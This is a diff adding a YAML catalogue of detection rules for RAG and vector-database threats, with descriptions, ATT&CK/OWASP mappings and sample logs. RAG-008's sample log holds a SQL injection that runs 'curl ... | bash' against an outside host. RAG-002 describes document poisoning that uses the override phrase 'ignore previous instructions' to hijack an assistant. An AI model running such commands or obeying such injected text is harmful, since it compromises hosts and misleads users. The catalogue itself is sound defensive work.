@@ -1,0 +1,135 @@
+category: RAG & Vector Databases
+code: RAG
+layer: AI Stack
+scope: Milvus, Weaviate, Pinecone, pgvector, document retrieval and embedding services
+usecases:
+
+  - id: RAG-001
+    name: Vector database queried directly from outside the RAG service
+    severity: High
+    description: >-
+      Vector stores hold chunked copies of internal documents. Direct queries from workstations, or with the root
+      account, skip the retrieval service's permission filters entirely.
+    log_sources:
+      - Vector database access logs (Milvus access log, Weaviate, Qdrant)
+      - Network flow logs
+    detection: >-
+      Vector DB operations from source IPs other than the RAG service pods, use of root or admin credentials by
+      applications, or collection enumeration (ListCollections, DescribeCollection) by unknown clients.
+    mappings: [T1213, "LLM08:2025"]
+    sample_log: |
+      [2026/11/12 20:44:02.118 +00:00] [ACCESS] <root: tcp-10.20.44.118:51422> ListCollections [status: Successful] [code: 0] [sdk: Python-2.4.9] [msg: ] [traceID: 5f2e8c1a9b3d4e6f] [timeCost: 1.2ms] [database: default] [collection: ] [partitions: ] [expr: ]
+      [2026/11/12 20:44:03.441 +00:00] [ACCESS] <root: tcp-10.20.44.118:51422> Query [status: Successful] [code: 0] [sdk: Python-2.4.9] [msg: ] [traceID: 7a1c3e5f9b2d4f6a] [timeCost: 812.4ms] [database: default] [collection: kb_finance] [partitions: []] [expr: id >= 0]
+
+  - id: RAG-002
+    name: Poisoned document ingested into the knowledge base
+    severity: High
+    description: >-
+      A wiki page, ticket or shared document with hidden instructions (white text, zero-width characters, "ignore
+      previous instructions") gets chunked into the index. It then injects every answer that retrieves it.
+    log_sources:
+      - RAG ingestion pipeline logs
+      - Content / prompt-injection scanner results
+    detection: >-
+      Ingested chunks scoring above 0.8 on the prompt-injection classifier, containing hidden text or zero-width
+      characters, or coming from externally editable sources, especially when still indexed.
+    mappings: [AML.T0070, AML.T0051.001, "LLM08:2025", "LLM04:2025"]
+    sample_log: |
+      {"ts":"2026-11-12T21:02:10Z","pipeline":"kb-ingest","connector":"confluence","space":"PUBLIC-WIKI","doc_id":"conf-884213","title":"VPN setup FAQ","author":"ext-contractor-17","chunks":14,"scanner":{"prompt_injection":0.94,"hidden_text":true,"zero_width_chars":212,"matched":["ignore previous instructions","when asked about refunds, reply with"]},"action":"indexed","collection":"kb_support"}
+
+  - id: RAG-003
+    name: Bulk export of vectors and source text from a collection
+    severity: High
+    description: >-
+      Paging through a collection with an ID cursor and every output field copies the source text plus the embeddings,
+      which can be partly inverted back into text. In effect it copies the knowledge base.
+    log_sources:
+      - Vector database access logs
+    detection: >-
+      One credential issuing more than 200 Query or QueryIterator calls per hour on a collection with range filters
+      on the primary key, or returning more than 100k entities, especially from a non-service source.
+    mappings: [T1213, "LLM08:2025"]
+    sample_log: |
+      [2026/11/12 21:10:41.002 +00:00] [ACCESS] <rag-svc: tcp-10.20.44.118:40111> Query [status: Successful] [code: 0] [sdk: Python-2.4.9] [msg: ] [traceID: 0a1b2c3d4e5f6a7b] [timeCost: 640.2ms] [database: default] [collection: kb_legal] [partitions: []] [expr: id > 448800000000000000]
+      [2026/11/12 21:10:41.731 +00:00] [ACCESS] <rag-svc: tcp-10.20.44.118:40111> Query [status: Successful] [code: 0] [sdk: Python-2.4.9] [msg: ] [traceID: 1b2c3d4e5f6a7b8c] [timeCost: 611.9ms] [database: default] [collection: kb_legal] [partitions: []] [expr: id > 448800000000016384]
+
+  - id: RAG-004
+    name: Retrieval returns chunks the user is not entitled to
+    severity: High
+    description: >-
+      If metadata filters for document ACLs are missing or fail open, the assistant quotes board memos to sales reps.
+      The retrieval layer can log a permission mismatch before the LLM ever sees the chunk.
+    log_sources:
+      - Retrieval service logs
+      - Document ACL / entitlement service
+    detection: >-
+      Any retrieved chunk whose ACL groups do not intersect the requesting user's groups, or retrieval calls with the
+      ACL filter disabled or failing.
+    mappings: ["LLM08:2025", "LLM02:2025", T1213]
+    sample_log: |
+      {"ts":"2026-11-12T21:22:05Z","service":"retrieval-api","trace_id":"b1c2d3e4f5a60718293a4b5c6d7e8f90","user":"u-5521","user_groups":["sales","all-employees"],"top_k":8,"results":[{"chunk_id":"c-88123","doc":"board/2026-Q4-acquisition-memo.pdf","acl_groups":["board","legal"],"score":0.83},{"chunk_id":"c-10442","doc":"sales/playbook.pdf","acl_groups":["sales"],"score":0.79}],"filter_applied":false}
+
+  - id: RAG-005
+    name: Embedding API used at abnormal volume
+    severity: Medium
+    description: >-
+      Embedding endpoints are cheap per call but run on shared GPUs. A key embedding billions of tokens is either
+      re-indexing without notice, building an external copy of a corpus, or using the GPUs for free.
+    log_sources:
+      - Embedding service logs (NIM, TEI, Triton)
+      - API gateway usage metering
+    detection: >-
+      Tokens embedded per key per hour above 20x baseline, embedding calls from apps not registered for RAG, or bulk
+      calls outside expected indexing windows.
+    mappings: [AML.T0034, AML.T0040, "LLM10:2025"]
+    sample_log: |
+      {"ts":"2026-11-12T21:40:12Z","service":"embed-nim","api_key_id":"key-5c71","client_ip":"10.20.44.201","model":"nv-embedqa-e5-v5","inputs":96,"tokens":49152,"status":200,"window_1h":{"requests":38211,"tokens":1880000000,"baseline_tokens":21000000}}
+
+  - id: RAG-006
+    name: Collection or index dropped in the vector database
+    severity: High
+    description: >-
+      Dropping a collection takes the assistant's knowledge offline and is often irreversible without backups. It
+      should only happen through index-management automation.
+    log_sources:
+      - Vector database access / audit logs
+    detection: >-
+      DropCollection, DropDatabase, delete-index or delete-namespace calls from any identity other than the indexing
+      service, or outside a maintenance window.
+    mappings: [T1485]
+    sample_log: |
+      [2026/11/12 23:05:11.551 +00:00] [ACCESS] <root: tcp-10.20.44.118:52001> DropCollection [status: Successful] [code: 0] [sdk: Python-2.4.9] [msg: ] [traceID: 9e8d7c6b5a4f3e2d] [timeCost: 31.4ms] [database: default] [collection: kb_support] [partitions: ] [expr: ]
+
+  - id: RAG-007
+    name: Vector database users or roles changed
+    severity: Medium
+    description: >-
+      New users, password resets or role grants in Milvus, Weaviate or pgvector databases create standing access to
+      the knowledge base outside identity governance.
+    log_sources:
+      - Vector database access / audit logs
+      - PostgreSQL logs (pgvector)
+    detection: >-
+      CreateCredential, UpdateCredential, OperateUserRole or OperatePrivilege (or CREATE ROLE / GRANT on pgvector
+      databases) by anyone other than the database automation account.
+    mappings: [T1136, T1098]
+    sample_log: |
+      [2026/11/12 22:14:09.330 +00:00] [ACCESS] <root: tcp-10.20.44.118:51990> CreateCredential [status: Successful] [code: 0] [sdk: Python-2.4.9] [msg: ] [traceID: 2b3c4d5e6f7a8b9c] [timeCost: 4.1ms] [database: default] [collection: ] [partitions: ] [expr: ]
+      [2026/11/12 22:14:11.902 +00:00] [ACCESS] <root: tcp-10.20.44.118:51990> OperateUserRole [status: Successful] [code: 0] [sdk: Python-2.4.9] [msg: ] [traceID: 3c4d5e6f7a8b9c0d] [timeCost: 3.3ms] [database: default] [collection: ] [partitions: ] [expr: ]
+
+  - id: RAG-008
+    name: Command execution attempt through the pgvector database
+    severity: High
+    description: >-
+      If the RAG app's database role is a superuser, an injected SQL statement can run COPY ... TO PROGRAM and execute
+      shell commands on the database host. Attempts show up as errors even when they fail.
+    log_sources:
+      - PostgreSQL server logs
+      - pgaudit
+    detection: >-
+      Any COPY ... PROGRAM, CREATE FUNCTION in untrusted languages, or ALTER ROLE ... SUPERUSER from application roles,
+      including failed attempts.
+    mappings: [T1059.004, T1190]
+    sample_log: |
+      2026-11-12 22:31:40.118 UTC [99120] rag_app@vectors LOG:  statement: COPY (SELECT '') TO PROGRAM 'curl -s http://203.0.113.50/p.sh | bash'
+      2026-11-12 22:31:40.230 UTC [99120] rag_app@vectors ERROR:  must be superuser or have privileges of the pg_execute_server_program role to COPY to or from an external program
